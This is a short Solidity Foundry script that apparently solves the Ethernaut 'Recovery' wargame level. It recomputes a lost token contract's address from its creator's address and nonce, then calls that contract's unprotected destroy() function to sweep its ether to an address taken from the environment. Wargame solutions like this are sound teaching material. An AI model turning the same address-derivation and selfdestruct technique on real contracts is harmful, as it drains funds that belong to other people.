// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract RecoverEth {
    Recovery public instance = Recovery(0xF702e9a6831945ACca386B2a6B043A32a6fffFe3);

    function recoverEth() external view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)));
        address addr = address(uint160(uint256(hash)));
        return addr;
    }
}

contract RecoverSolution is Script {
    RecoverEth recover;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));

        recover = new RecoverEth();
        SimpleToken contractAdd = SimpleToken(payable(recover.recoverEth()));
        contractAdd.destroy(payable(vm.envAddress("ACC")));

        vm.stopBroadcast();
    }
}
